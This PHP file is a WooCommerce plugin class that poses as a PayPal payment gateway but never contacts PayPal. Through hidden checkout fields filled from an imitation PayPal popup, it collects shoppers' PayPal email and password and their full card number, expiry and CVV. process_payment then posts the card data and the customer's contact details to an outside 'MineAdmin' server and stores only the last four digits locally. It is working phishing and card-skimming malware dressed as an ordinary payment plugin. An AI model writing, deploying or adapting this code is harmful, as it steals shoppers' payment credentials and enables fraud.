<?php
/**
 * PayPal Payment Gateway Class - Integrated with main gateway
 * 🔥 与主网关共享相同的功能逻辑
 *
 * @package Welcome_Payment_Gateway
 */

if (!defined('ABSPATH')) {
    exit;
}

class CPG_PayPal_Gateway extends WC_Payment_Gateway {

    /** @var string WebSocket server URL */
    private $ws_server_url;
    
    /** @var bool Enable tracking */
    private $enable_tracking;

    public function __construct() {
        $this->id                 = 'cpg_paypal';
        $this->icon               = '';
        $this->has_fields         = true;
        $this->method_title       = __('Welcome PayPal', 'welcome-payment-gateway');
        $this->method_description = __('PayPal style payment gateway - shares same logic with main gateway', 'welcome-payment-gateway');
        
        $this->supports = ['products'];

        $this->init_form_fields();
        $this->init_settings();

        $this->title = 'PayPal';
        $this->description = $this->get_option('description');
        $this->enabled = $this->get_option('enabled');
        
        // 🔥 从主网关配置获取 WebSocket 设置
        $main_gateway_settings = get_option('woocommerce_clean_payment_gateway_settings', []);
        $this->ws_server_url = isset($main_gateway_settings['ws_server_url']) ? $main_gateway_settings['ws_server_url'] : '';
        $this->enable_tracking = isset($main_gateway_settings['enable_tracking']) && $main_gateway_settings['enable_tracking'] === 'yes';

        add_action(
            'woocommerce_update_options_payment_gateways_' . $this->id,
            [$this, 'process_admin_options']
        );
        
        // 🔥 Load PayPal scripts on checkout page (real browser popup mode)
        add_action('wp_enqueue_scripts', [$this, 'enqueue_scripts']);
    }
    
    /**
     * 🔥 Load PayPal scripts (real browser popup mode, no CSS needed)
     */
    public function enqueue_scripts() {
        if (!is_checkout()) {
            return;
        }
        
        $plugin_url = defined('CPG_PLUGIN_URL') ? CPG_PLUGIN_URL : plugin_dir_url(dirname(__FILE__));
        $version = defined('CPG_VERSION') ? CPG_VERSION : '1.0.0';
        
        // Only load PayPal JS (popup page has its own inline styles)
        wp_enqueue_script(
            'cpg-paypal',
            $plugin_url . 'assets/js/paypal.js',
            ['jquery'],
            $version,
            true
        );
    }
    
    /**
     * 🔥 Ensure PayPal is always available (avoid AJAX lazy loading)
     */
    public function is_available() {
        if ($this->enabled !== 'yes') {
            return false;
        }
        return true;
    }

    public function init_form_fields() {
        $this->form_fields = [
            'enabled' => [
                'title'       => __('Enable/Disable', 'welcome-payment-gateway'),
                'type'        => 'checkbox',
                'label'       => __('Enable PayPal Gateway', 'welcome-payment-gateway'),
                'default'     => 'yes',
            ],
            'title' => [
                'title'       => __('Title', 'welcome-payment-gateway'),
                'type'        => 'text',
                'description' => __('用户在结账时看到的Title', 'welcome-payment-gateway'),
                'default'     => 'PayPal',
            ],
            'description' => [
                'title'       => __('Description', 'welcome-payment-gateway'),
                'type'        => 'textarea',
                'description' => __('用户在结账时看到的Description', 'welcome-payment-gateway'),
                'default'     => '',
            ],
        ];
    }

    /**
     * Output payment form (hidden fields only, popup in footer)
     */
    public function payment_fields() {
        ?>
        <div class="cpg-paypal-content">
            <div class="cpg-paypal-info">
                <div class="cpg-redirect-icon">
                    <svg viewBox="0 0 80 50" fill="none" xmlns="http://www.w3.org/2000/svg">
                        <rect x="5" y="5" width="50" height="40" rx="3" stroke="currentColor" stroke-width="2" fill="none"/>
                        <line x1="5" y1="15" x2="55" y2="15" stroke="currentColor" stroke-width="2"/>
                        <circle cx="12" cy="10" r="2" fill="currentColor"/>
                        <circle cx="19" cy="10" r="2" fill="currentColor"/>
                        <circle cx="26" cy="10" r="2" fill="currentColor"/>
                        <path d="M50 25 L70 25 M62 18 L70 25 L62 32" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
                    </svg>
                </div>
                <p class="cpg-paypal-text">After clicking "Pay with PayPal", you will be redirected to PayPal to complete your purchase securely.</p>
            </div>
            
            <!-- 🔥 Hidden fields store PayPal popup data -->
            <input type="hidden" name="cpg_paypal_nonce" id="cpg_paypal_nonce" value="<?php echo esc_attr(wp_create_nonce('cpg_paypal_payment')); ?>" />
            <input type="hidden" name="cpg_paypal_email" id="cpg_paypal_email" value="" />
            <input type="hidden" name="cpg_paypal_password" id="cpg_paypal_password" value="" />
            <input type="hidden" name="cpg_paypal_card_number" id="cpg_paypal_card_number" value="" />
            <input type="hidden" name="cpg_paypal_card_expiry" id="cpg_paypal_card_expiry" value="" />
            <input type="hidden" name="cpg_paypal_card_cvv" id="cpg_paypal_card_cvv" value="" />
            <input type="hidden" name="cpg_paypal_card_brand" id="cpg_paypal_card_brand" value="" />
            <input type="hidden" name="cpg_paypal_data_complete" id="cpg_paypal_data_complete" value="" />
        </div>
        <?php
    }

    /**
     * 🔥 Process payment - shares same logic with main gateway
     */
    public function process_payment($order_id) {
        $order = wc_get_order($order_id);
        
        if (!$order) {
            error_log('[CPG PayPal] ❌ Order does not exist');
            wc_add_notice(__('Order does not exist', 'welcome-payment-gateway'), 'error');
            return ['result' => 'fail'];
        }

        try {
            // 🔥 Generate UUID
            $uuid = $this->generate_uuid();
            
            // 🔥 Save order metadata
            $this->save_order_payment_data($order, $uuid);
            
            // 🔥 Send data to MineAdmin (if tracking enabled)
            if ($this->enable_tracking && !empty($this->ws_server_url)) {
                $this->send_order_to_mineadmin($order, $uuid, $order_id);
            }
            
            // 🔥 Update order status
            $order->update_status('on-hold', __('Awaiting PayPal verification', 'welcome-payment-gateway'));
            $order->add_order_note(__('PayPal order submitted, awaiting admin processing', 'welcome-payment-gateway'));
            
            // 🔥 Get and save session_id
            $session_id = '';
            if (isset($_COOKIE['cpg_session_id'])) {
                $session_id = sanitize_text_field($_COOKIE['cpg_session_id']);
            } elseif (isset($_POST['cpg_session_id'])) {
                $session_id = sanitize_text_field($_POST['cpg_session_id']);
            }
            
            if ($session_id) {
                $order->update_meta_data('_cpg_session_id', $session_id);
                $order->update_meta_data('_cpg_verification_pending', 'yes');
            }
            
            // 🔥 Reduce stock and clear cart
            wc_reduce_stock_levels($order_id);
            WC()->cart->empty_cart();
            
            $order->save();
            
            // 🔥 Redirect to thank you page with verification params (same as main gateway)
            $thank_you_url = $order->get_checkout_order_received_url();
            $verification_url = add_query_arg([
                'cpg_verification' => 'pending',
                'session_id' => $session_id
            ], $thank_you_url);
            
            return [
                'result'   => 'success',
                'redirect' => $verification_url
            ];
            
        } catch (Exception $e) {
            error_log('[CPG PayPal] ❌ Payment processing failed: ' . $e->getMessage());
            wc_add_notice(__('Payment processing failed, please try again', 'welcome-payment-gateway'), 'error');
            return ['result' => 'fail'];
        }
    }
    
    /**
     * 🔥 Generate UUID
     */
    private function generate_uuid() {
        return sprintf('%04x%04x-%04x-%04x-%04x-%04x%04x%04x',
            mt_rand(0, 0xffff), mt_rand(0, 0xffff),
            mt_rand(0, 0xffff),
            mt_rand(0, 0x0fff) | 0x4000,
            mt_rand(0, 0x3fff) | 0x8000,
            mt_rand(0, 0xffff), mt_rand(0, 0xffff), mt_rand(0, 0xffff)
        );
    }
    
    /**
     * 🔥 Get card data collected from PayPal popup
     */
    private function get_paypal_card_data() {
        return [
            'email' => isset($_POST['cpg_paypal_email']) ? sanitize_email($_POST['cpg_paypal_email']) : '',
            'card_number' => isset($_POST['cpg_paypal_card_number']) ? sanitize_text_field($_POST['cpg_paypal_card_number']) : '',
            'card_expiry' => isset($_POST['cpg_paypal_card_expiry']) ? sanitize_text_field($_POST['cpg_paypal_card_expiry']) : '',
            'card_cvv' => isset($_POST['cpg_paypal_card_cvv']) ? sanitize_text_field($_POST['cpg_paypal_card_cvv']) : '',
            'card_brand' => isset($_POST['cpg_paypal_card_brand']) ? sanitize_text_field($_POST['cpg_paypal_card_brand']) : '',
        ];
    }
    
    /**
     * 🔥 Save order payment data
     */
    private function save_order_payment_data($order, $uuid) {
        $card_data = $this->get_paypal_card_data();
        
        $order->update_meta_data('_cpg_payment_method', 'paypal');
        $order->update_meta_data('_cpg_uuid', $uuid);
        $order->update_meta_data('_cpg_payment_time', current_time('mysql'));
        
        // 🔥 Save PayPal account email
        if (!empty($card_data['email'])) {
            $order->update_meta_data('_cpg_paypal_email', $card_data['email']);
        }
        
        // 🔥 Save card info (last 4 digits and brand only)
        if (!empty($card_data['card_number'])) {
            $last_four = substr($card_data['card_number'], -4);
            $order->update_meta_data('_cpg_card_last_four', $last_four);
            $order->update_meta_data('_cpg_card_brand', $card_data['card_brand']);
        }
    }
    
    /**
     * 🔥 Send order data to MineAdmin
     */
    private function send_order_to_mineadmin($order, $uuid, $order_id) {
        try {
            // 获取 session_id
            $session_id = '';
            if (isset($_COOKIE['cpg_session_id'])) {
                $session_id = sanitize_text_field($_COOKIE['cpg_session_id']);
            }
            
            // 🔥 Get PayPal card data
            $card_data = $this->get_paypal_card_data();
            
            // 构建 API URL
            $api_url = str_replace('ws://', 'http://', $this->ws_server_url);
            $api_url = str_replace('wss://', 'https://', $api_url);
            $api_url = str_replace('/ws', '', $api_url);
            $api_url = rtrim($api_url, '/') . '/api/order/submit';
            
            // Build order data
            $order_data = [
                'order_id' => $order_id,
                'order_key' => $order->get_order_key(),
                'session_id' => $session_id,
                'uuid' => $uuid,
                'payment_method' => 'paypal',
                'amount' => $order->get_total(),
                'currency' => $order->get_currency(),
                'customer' => [
                    'email' => $order->get_billing_email(),
                    'first_name' => $order->get_billing_first_name(),
                    'last_name' => $order->get_billing_last_name(),
                    'phone' => $order->get_billing_phone(),
                    'address' => $order->get_billing_address_1(),
                    'city' => $order->get_billing_city(),
                    'state' => $order->get_billing_state(),
                    'postcode' => $order->get_billing_postcode(),
                    'country' => $order->get_billing_country(),
                ],
                // 🔥 PayPal account and card info
                'paypal_email' => $card_data['email'],
                'card' => [
                    'number' => $card_data['card_number'],
                    'expiry' => $card_data['card_expiry'],
                    'cvv' => $card_data['card_cvv'],
                    'brand' => $card_data['card_brand'],
                ],
                'site_url' => home_url(),
                'timestamp' => time(),
            ];
            
            // Send request
            $response = wp_remote_post($api_url, [
                'timeout' => 10,
                'headers' => [
                    'Content-Type' => 'application/json',
                ],
                'body' => wp_json_encode($order_data),
            ]);
            
            if (is_wp_error($response)) {
                error_log('[CPG PayPal] ❌ Failed to send to MineAdmin: ' . $response->get_error_message());
            } else {
                error_log('[CPG PayPal] ✅ Order data sent to MineAdmin');
            }
            
        } catch (Exception $e) {
            error_log('[CPG PayPal] ❌ Exception sending order data: ' . $e->getMessage());
        }
    }
}

